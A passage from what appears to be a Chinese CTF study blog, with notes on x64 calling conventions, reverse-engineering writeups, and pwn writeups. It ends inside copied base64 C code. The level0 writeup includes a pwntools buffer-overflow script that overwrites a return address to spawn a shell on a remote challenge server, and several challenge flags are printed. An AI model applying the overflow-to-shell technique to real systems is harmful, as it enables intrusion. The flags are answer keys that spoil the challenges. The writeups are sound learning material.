class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H(a, b, c, d, e, f, g, h);</span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9</span><br><span class="line">h-&gt;8(%esp)</span><br><span class="line">g-&gt;(%esp)</span><br><span class="line">call H</span><br></pre></td></tr></table></figure><p>附64位寄存器表：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220510114555550.png" alt="image-20220510114555550"></p><h3 id="windows："><a href="#windows：" class="headerlink" title="windows："></a>windows：</h3><p>摘抄：<a href="https://www.cnblogs.com/iBinary/p/10959444.html">https://www.cnblogs.com/iBinary/p/10959444.html</a></p><p>x64调用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub rsp,0x28</span><br><span class="line"></span><br><span class="line">mov r9,1</span><br><span class="line">mov r8,2</span><br><span class="line">mov rdx,3</span><br><span class="line">mov rcx,4</span><br><span class="line">call xxx</span><br><span class="line">add rsp,0x28</span><br></pre></td></tr></table></figure><p><strong>传参方式：</strong><br>    首先说明一下,在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈</p><p><strong>申请参数预留空间：</strong><br>    在x64下,在调用一个函数的时候,会申请一个参数预留空间.用来保存我们的参数.比如以前我们通过push压栈<br>参数的值.相应的栈就会抬高.其实x64下,一样会申请.只不过这个地方在进函数的时候并没有值.进入函数之后才会将寄存器的值在拷贝到这个栈中.其实就相当于你还是push了.只不过我是外边申请空间,内部进行赋值。</p><p>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sub rsp,0x28          //申请的栈空间为0x28,就相当于我们push rcx rdx r8 r9.只不过只是申请.</span><br><span class="line">call xxxx</span><br><span class="line">add rsp,0x28</span><br><span class="line"></span><br><span class="line">xxx                  //函数内部</span><br><span class="line"></span><br><span class="line">mov [rsp - 8],rcx</span><br><span class="line">mov [rsp - 0x10],rdx</span><br><span class="line">mov [rsp - 0x18],r8</span><br><span class="line">mov [rsp - 0x20],r9</span><br><span class="line"></span><br><span class="line">xxx </span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ol><li>在调用函数之前,会申请参数预留空间.(rcx,rdx,r8,r9)</li><li>函数内部,会将寄存器传参的值(rcx,rdx,r8,r9)保存到我们申请的预留空间中.<br>上面这两步其实就相当于x86下的 push r9 push r8 push rdx,push rcx</li><li>调用约定是__fastcall.传参有rcx rdx,平栈是按照c调用约定平栈. 也就是调用者平栈.</li></ol>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_babyXOR_reverse</title>
      <link href="/2022/02/25/writeup_babyXOR_reverse/"/>
      <url>/2022/02/25/writeup_babyXOR_reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-babyXOR-reverse"><a href="#writeup-babyXOR-reverse" class="headerlink" title="writeup_babyXOR_reverse"></a>writeup_babyXOR_reverse</h1><p>有不知名壳，esp定律手动脱</p><p>放进ida，好家伙，七百个函数，离大谱</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195451797.png" alt="image-20220225195451797"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195553195.png" alt="image-20220225195553195"></p><p>先看看main函数里有啥，发现花里胡哨，查教程，麻烦的离谱，果断动调看看。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195818909.png" alt="image-20220225195818909"></p><p>上为输入函数，随便输入了一串字符</p><p>运行到此处发现：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195903238.png" alt="image-20220225195903238"></p><p>阿哲？</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220225195928601.png" alt="image-20220225195928601"></p><p>行8</p><p><strong>flag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</strong></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_level2_pwn</title>
      <link href="/2022/02/24/writeup_level2_pwn/"/>
      <url>/2022/02/24/writeup_level2_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-level2-pwn"><a href="#writeup-level2-pwn" class="headerlink" title="writeup_level2_pwn"></a>writeup_level2_pwn</h1><p>属于是level0的升级版，没啥可查的，直接ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224164752204.png" alt="image-20220224164752204"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224164800080.png" alt="image-20220224164800080"></p><p>可以看到，依然是有缓冲区溢出漏洞的一个函数，buf数组的大小转换成十六进制也就0x88，却能读入0x100的数据。</p><p>依然是通过溢出，对函数的返回地址进行覆盖：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165046553.png" alt="image-20220224165046553"></p><p>进入调用函数system，然而system函数需要一个参数的地址（即/bin/sh)字符串的地址，我们没有该字符串，无法虚空调用，只能在程序的字符串列表中进行寻找：<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165329105.png" alt="image-20220224165329105"></p><p>view-subview-string可以看到系统贴心的准备了：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224165416046.png" alt="image-20220224165416046"></p><p>现在我们就可以在调用<code>_system</code>函数时，通过缓冲区的覆盖把字符串的地址也提前覆盖进去：</p><p>创作一下脚本：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224171047696.png" alt="image-20220224171047696"></p><p>行！</p><p>cyberpeace{40fb2960396105316b3733bd0c6cf1fd}</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_level0_pwn</title>
      <link href="/2022/02/24/writeup_level0_pwn/"/>
      <url>/2022/02/24/writeup_level0_pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-level0-pwn"><a href="#writeup-level0-pwn" class="headerlink" title="writeup_level0_pwn"></a>writeup_level0_pwn</h1><p>ida打开附件：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153914432.png" alt="image-20220224153914432"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224153937936.png" alt="image-20220224153937936"></p><p>可以看到read函数把int读入数组，有溢出漏洞，然后找到程序中的危险函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154528561.png" alt="image-20220224154528561"></p><p>只要成功对此函数实现调用就可以通过sh命令行控制系统。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224154721048.png" alt="image-20220224154721048"></p><p>查看数据区域，可以看到上面贴心的给出了解释，r和s代表了程序的返回地址和储存的寄存器值，我们只要通过缓冲区溢出覆盖程序的返回地址，将返回地址覆盖为我们的目标函数起始地址，即可执行该函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155005913.png" alt="image-20220224155005913"></p><p>起始地址锁定为596，直接脚本抄袭开始!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#导入 pwntools 中 pwn 包的所有内容 </span></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">33907</span>) <span class="comment"># 链接服务器远程交互 </span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level0&#x27;</span>) <span class="comment"># 以 ELF 文件格式读取 level0 文件 </span></span><br><span class="line">sysaddr = elf.symbols[<span class="string">&#x27;callsystem&#x27;</span>] <span class="comment"># 获取 ELF 文件中 callsystem 的地址 </span></span><br><span class="line"><span class="comment"># 先用 0x88 个无用字符覆盖 buf 和 push 的内容，再覆盖返回地址 </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span> + <span class="number">8</span>) + p64(sysaddr) </span><br><span class="line">p.recv() <span class="comment">#接收输出 p.send(payload) # 发送 payload </span></span><br><span class="line">p.interactive() <span class="comment"># 反弹 shell 进行交互</span></span><br></pre></td></tr></table></figure><p>太详细了，爱了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155638026.png" alt="image-20220224155638026"></p><p>小跑一下，结果报错了。。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224155803770.png" alt="image-20220224155803770"></p><p>python3需要将字符串转化为二进制。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220224160542356.png" alt="image-20220224160542356"></p><p>pwn好复杂233</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_easyMaze_reverse</title>
      <link href="/2022/02/23/writeup_easyMaze_reverse/"/>
      <url>/2022/02/23/writeup_easyMaze_reverse/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-easyMaze-reverse"><a href="#writeup-easyMaze-reverse" class="headerlink" title="writeup_easyMaze_reverse"></a>writeup_easyMaze_reverse</h1><p>elf文件，直接ida：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113010570.png" alt="image-20220223113010570">main函数里定义了一大堆变量。</p><p>为了便于分析，从step_2开始看起：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113150953.png" alt="image-20220223113150953"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113157081.png" alt="image-20220223113157081"></p><p>循环校验输入（WASD)，然后按照输入内容控制输出相关结果。</p><p>再看加密逻辑：</p><p>step_0貌似是在生成地图</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113401327.png" alt="image-20220223113401327"></p><p>step1中还有子调用，太麻烦了，因此直接选择动态调试，在step2直接查看数据。</p><p>连接linux开始动态调试：<br>断点下载step_2的循环开始处：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113547109.png" alt="image-20220223113547109"></p><p>双击a1数组查看变量：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113621065.png" alt="image-20220223113621065"></p><p>很多0和1组成的数组，d键位转化为dd，然后右键生成数组，长度为49</p><p><em>（dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4；）</em></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223113959158.png" alt="image-20220223113959158"></p><p>复制，生成地图：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223114043238.png" alt="image-20220223114043238"></p><p>按照地图，应该为 <strong>SSDDWDWDDDSSAASASAAASSDDDDWDDS</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220223114516245.png" alt="image-20220223114516245"></p><p>最终flag：UNCTF{ssddwdwdddssaasasaaassddddwdds}</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编 db,dw,dd的区别</title>
      <link href="/2022/02/23/%E6%B1%87%E7%BC%96dd%20dw%20db%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/02/23/%E6%B1%87%E7%BC%96dd%20dw%20db%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编-db-dw-dd的区别"><a href="#汇编-db-dw-dd的区别" class="headerlink" title="汇编 db,dw,dd的区别"></a>汇编 db,dw,dd的区别</h1><p>db定义字节类型变量，一个字节数据占1个字节单元，读完一个，偏移量加1；</p><p>dw定义字类型变量，一个字数据占2个字节单元，读完一个，偏移量加2；</p><p>dd定义双字类型变量，一个双字数据占4个字节单元，读完一个，偏移量加4；</p><p>dq定义四字节类型，一个四字类型数据占8个字节单元；</p><p>格式：〔符号名〕 DB\DW\DD\DF\DQ\DT 初值序列<br>DB定义的为字节类型，DW定义字类型，DD定义双字类型,DF为长字类型,DQ为四字类型,DT为十字节类型,该指令分别定义8位,16位,32位,48位,64位,80位的数据</p><p>DW就是表示为该数据分配一个字的存储空间,即16位</p><p>摘抄自：<a href="https://blog.csdn.net/baidu_37503452/article/details/83147318">https://blog.csdn.net/baidu_37503452/article/details/83147318</a></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_梅津美治郎reserve</title>
      <link href="/2022/02/22/writeup_%E6%A2%85%E6%B4%A5%E7%BE%8E%E6%B2%BB%E9%83%8Ereserve/"/>
      <url>/2022/02/22/writeup_%E6%A2%85%E6%B4%A5%E7%BE%8E%E6%B2%BB%E9%83%8Ereserve/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-梅津美治郎reserve"><a href="#writeup-梅津美治郎reserve" class="headerlink" title="writeup_梅津美治郎reserve"></a>writeup_梅津美治郎reserve</h1><p>查壳，没壳</p><p>ida打开：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222144540525.png" alt="image-20220222144540525"></p><p>level1太简单不说，r0b0RUlez！</p><p>直接，步入<code>sub_4015EA</code></p><p>发现有一个九次的小递归：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222144708771.png" alt="image-20220222144708771"></p><p>判断有猫腻，直接上动调，然而x32dbg怎么调都是一个异常终止。</p><p>查wp，改用虚拟机下的od，可以正常运行，简单的概述一下具体情况：</p><p>在运行完<code>int3</code>语句后，程序跳转到7地址开头系统领空，一段时间后，再次调用了4开头的正常函数，可以猜到应该是level2的主函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145151675.png" alt="image-20220222145151675"></p><p>逻辑很简单：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145245355.png" alt="image-20220222145245355"></p><p>直接比较了v1和另一串字符。</p><p>打开比较函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145347133.png" alt="image-20220222145347133"></p><p>可以看到是将a2异或2后进行的比较，至此比较流程已经清晰，下面找到a2就可以解决问题。</p><p>依然需要动调：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222145635117.png" alt="image-20220222145635117"></p><p>可以看到数据窗口中显示的就是实际参与比较的a2字符串（以02结尾），我们直接解密：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220222150024397.png" alt="image-20220222150024397"></p><p>为welldone字样，然而这还不是最终flag。。。</p><p>最终的flag是第一层的结果下划线第二层的结果，即：</p><p>flag{r0b0RUlez!_w3lld0ne}</p><p>坑爹啊。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>writeup_攻防世界_WindowsReserve2</title>
      <link href="/2022/02/21/writeup_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_WindowsReserve2/"/>
      <url>/2022/02/21/writeup_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_WindowsReserve2/</url>
      
        <content type="html"><![CDATA[<h1 id="writeup-攻防世界-WindowsReserve2"><a href="#writeup-攻防世界-WindowsReserve2" class="headerlink" title="writeup_攻防世界_WindowsReserve2"></a>writeup_攻防世界_WindowsReserve2</h1><p>首先，除了攻防世界的wp以外，网上关于这题的wp我个人都认为不太详细</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221154222199.png" alt="image-20220221154222199"></p><p>有as壳，esp定律手动脱壳。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221154312611.png" alt="image-20220221154312611"></p><p>拖入ida，根据功能对函数进行重命名：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221155246072.png" alt="image-20220221155246072"></p><p>锁定关键函数：</p><p>①检查输入函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221155643676.png" alt="image-20220221155643676"></p><p>②加密函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221195502946.png" alt="image-20220221195502946"></p><p>最后一位通过v9和v4加密，存入了v10</p><p>进入下一层逻辑：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221213003126.png" alt="image-20220221213003126"></p><p>仔细观察逻辑发现有一个密码表，通过python脚本转化一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221212858274.png" alt="image-20220221212858274"></p><p>发现还是经典base64，仔细观察代码逻辑，推测是base64加密函数。</p><p>因此，可以对程序的总体流程进行推测：</p><ol><li>传入加密函数，分奇数偶数位进行加密</li><li>加密后的内容进行base64编码（结果为reverse+）</li></ol><p>然而，对reverse+进行解码却发现解不开。。。这应该是其解码之后的结果无法打印</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221215648947.png" alt="image-20220221215648947"></p><p>遂自己写脚本如上，左侧为输出。</p><p>然后回到上一层函数</p><p>上一层函数的输出为173,235,222,174,199,190</p><p>因此可以初步判断本层函数的输入应为12位，由于可能性较少，可以直接正向碰撞，可能性仅仅有12*（10+6）种，直接复刻正向逻辑：</p><p>首先，上面的一大串加密逻辑的输出结果只可能是整数0~15</p><p>然后使用0~15循环碰撞输出结果，得到的值进行保存，</p><p>最终将得到的含有0<del>15整数的12位数组反向转化为0</del>9、A~F即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220221222215169.png" alt="image-20220221222215169"></p><p>终于搞定了。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>base64编码、解码c语言实现</title>
      <link href="/2022/02/21/base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2022/02/21/base64%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E7%9A%84c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>搬运自：<a href="https://blog.csdn.net/qq_26093511/article/details/78836087">https://blog.csdn.net/qq_26093511/article/details/78836087</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base64_encode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *str)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">long</span> len;  </span><br><span class="line">    <span class="keyword">long</span> str_len;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res;  </span><br><span class="line">    <span class="keyword">int</span> i,j;  </span><br><span class="line"><span class="comment">//定义base64编码表  </span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *base64_table=<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//计算经过base64编码后的字符串长度  </span></span><br><span class="line">    str_len=<span class="built_in">strlen</span>(str);  </span><br><span class="line">    <span class="keyword">if</span>(str_len % <span class="number">3</span> == <span class="number">0</span>)  </span><br><span class="line">        len=str_len/<span class="number">3</span>*<span class="number">4</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        len=(str_len/<span class="number">3</span>+<span class="number">1</span>)*<span class="number">4</span>;  </span><br><span class="line">  </span><br><span class="line">    res=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*len+<span class="number">1</span>);  </span><br><span class="line">    res[len]=<span class="string">&#x27;\0&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//以3个8位字符为一组进行编码  </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;len<span class="number">-2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        res[i]=base64_table[str[j]&gt;&gt;<span class="number">2</span>]; </span><br><span class="line"><span class="comment">//取出第一个字符的前6位并找出对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">1</span>]=base64_table[(str[j]&amp;<span class="number">0x3</span>)&lt;&lt;<span class="number">4</span> | (str[j+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)]; </span><br><span class="line"><span class="comment">//将第一个字符的后位与第二个字符的前4位进行组合并找到对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">2</span>]=base64_table[(str[j+<span class="number">1</span>]&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">2</span> | (str[j+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)]; </span><br><span class="line"><span class="comment">//将第二个字符的后4位与第三个字符的前2位组合并找出对应的结果字符  </span></span><br><span class="line">        res[i+<span class="number">3</span>]=base64_table[str[j+<span class="number">2</span>]&amp;<span class="number">0x3f</span>]; </span><br><span class="line"><span class="comment">//取出第三个字符的后6位并找出结果字符  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span>(str_len % <span class="number">3</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            res[i<span class="number">-2</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            res[i<span class="number">-1</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            res[i<span class="number">-1</span>]=<span class="string">&#x27;=&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> *<span class="title">base64_decode</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *code)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//根据base64表，以字符找到对应的十进制数据  </span></span><br><span class="line">    <span class="keyword">int</span> table[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">62</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">63</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">54</span>,<span class="number">55</span>,<span class="number">56</span>,<span class="number">57</span>,<span class="number">58</span>,</span><br><span class="line">     <span class="number">59</span>,<span class="number">60</span>,<span class="number">61</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">     <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,</span><br><span class="line">     <span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,</span><br><span class="line">     <span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span>,</span><br><span class="line">     <span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,</span><br><span class="line">     <span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>,<span class="number">39</span>,<span class="number">40</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">44</span>,</span><br><span class="line">     <span class="number">45</span>,<span class="number">46</span>,<span class="number">47</span>,<span class="number">48</span>,<span 